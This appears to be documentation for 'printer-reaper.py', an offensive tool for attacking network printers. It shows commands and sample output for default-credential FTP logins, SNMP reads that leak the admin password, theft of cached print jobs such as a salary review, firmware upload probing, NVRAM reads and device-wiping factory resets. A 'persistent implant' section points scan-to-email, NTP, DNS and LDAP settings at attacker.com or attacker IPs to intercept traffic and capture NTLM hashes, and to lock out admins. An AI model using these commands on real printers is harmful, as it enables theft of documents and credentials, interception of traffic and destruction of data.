# Storage & Firmware

---

## Storage Audit

```bash
python printer-reaper.py 192.168.1.100 --storage
```

Performs a complete audit of all storage access vectors:

### FTP File Server

Many printers expose an FTP server on port 21 for print job spooling and file transfer:

```
[FTP] 192.168.1.100:21
  Login with: admin:epson  → 230 Login successful
  Listing:
    /incoming/         (print job spool)
    /outgoing/         (scan output)
    /firmware/         (firmware staging area)
    /config/           (configuration backups)
  Files found:
    /config/netconfig.xml        (network configuration)
    /config/useraccounts.xml     (user credentials)
    /incoming/job_20260324.pcl   (cached print job)
```

### Web File Manager (EWS)

```
[HTTP] EWS file manager paths probed:
  /hp/device/directory/          → 200 OK (HP LaserJet)
  /web/guest/en/websys/webArch/  → 200 OK (Ricoh)
  /PRESENTATION/HTML/            → 200 OK (Epson)
  /wcd/filemanager.pl            → 403 Forbidden (Konica)
  /filemanager/                  → 404
```

### SNMP MIB Walk

```
[SNMP] Walking 2000+ OIDs ...
  sysDescr     = EPSON L3250 Series
  hrStorage    = 128MB Flash, 34% used
  prtJobTable  = 3 completed jobs in history
  prtAlert     = none
  Proprietary OIDs:
    1.3.6.1.4.1.1248.1.2.2.1.1.1.4.1 = "admin"      (admin username)
    1.3.6.1.4.1.1248.1.2.2.1.1.1.5.1 = "epson"      (admin password)
```

### Saved Print Job Retrieval

```
[JOBS] Retrieving saved/cached print jobs ...
  Job 001: report_Q4_2025.pdf  (32KB)  2026-03-20 14:22
  Job 002: salary_review.docx  (18KB)  2026-03-21 09:15
  Job 003: board_presentation.pptx  (2.1MB)  2026-03-24 11:30
  [+] Downloaded 3 print jobs to .log/captured_jobs/
```

---

## Firmware Audit

```bash
python printer-reaper.py 192.168.1.100 --firmware
```

Performs a firmware security assessment:

### Version Extraction

```
[FW] Firmware version: 05.22.XF26P8
[FW] Release date: 2024-11-12
[FW] Available update: 05.30.XF31P1 (2025-08-20)
[FW] CVEs patched in latest: CVE-2024-51982, CVE-2024-51978
```

### Upload Endpoint Check

Probes all known firmware upload paths to detect unauthenticated upload vulnerabilities:

```
[FW] Probing upload endpoints ...
  POST /firmware/upload.cgi       → 401 Unauthorized (requires auth)
  POST /hp/device/firmware/       → 404 Not Found
  PUT  /firmware/update           → 403 Forbidden
  POST /webInterface/firmwareUpd  → 200 OK (VULNERABLE - no auth check)
```

### NVRAM Probe

```
[FW] NVRAM probe via PJL ...
  @PJL NVRAMREAD
  Address 0x0000: 01 00 00 00 FF FF FF FF ...
  Address 0x0100: 41 44 4D 49 4E 00 ...  (= "ADMIN")

[FW] Known NVRAM offsets for this model:
  0x0100: Admin username
  0x0120: Admin password hash
  0x0200: Network config
```

---

## Factory Reset

```bash
# Via PJL (most common — HP, Epson, Lexmark)
python printer-reaper.py 192.168.1.100 --firmware-reset pjl

# Via web interface (EWS) — HP, Ricoh, Canon
python printer-reaper.py 192.168.1.100 --firmware-reset web

# Via IPP (Brother, Kyocera)
python printer-reaper.py 192.168.1.100 --firmware-reset ipp
```

**WARNING:** Factory reset is irreversible and will erase all configuration, credentials, and network settings. Only use in authorized labs.

By default, `--firmware-reset` runs in dry-run mode (probes endpoints without executing). Add `--no-dry` to actually perform the reset.

---

## Persistent Config Implant

Modify the printer's persistent configuration to maintain access or intercept traffic:

```bash
# Redirect all scan-to-email through your SMTP relay
python printer-reaper.py 192.168.1.100 --implant smtp_host=attacker.com

# Change DNS (affects all hostname lookups from the printer)
python printer-reaper.py 192.168.1.100 --implant dns=192.168.1.200

# Change SNMP write community (lock out legitimate admins)
python printer-reaper.py 192.168.1.100 --implant snmp_community=s3cr3t

# Change NTP server (time manipulation)
python printer-reaper.py 192.168.1.100 --implant ntp=attacker.com

# Change LDAP server (NTLM hash capture - see Lateral Movement)
python printer-reaper.py 192.168.1.100 --implant ldap_host=192.168.1.200
```

Implants are written via:
1. PJL `@PJL SET` or `@PJL DEFAULT` (volatile/persistent)
2. HTTP POST to EWS configuration endpoints
3. SNMP SET to writable OIDs

The implant persists across printer power cycles when written to NVRAM.
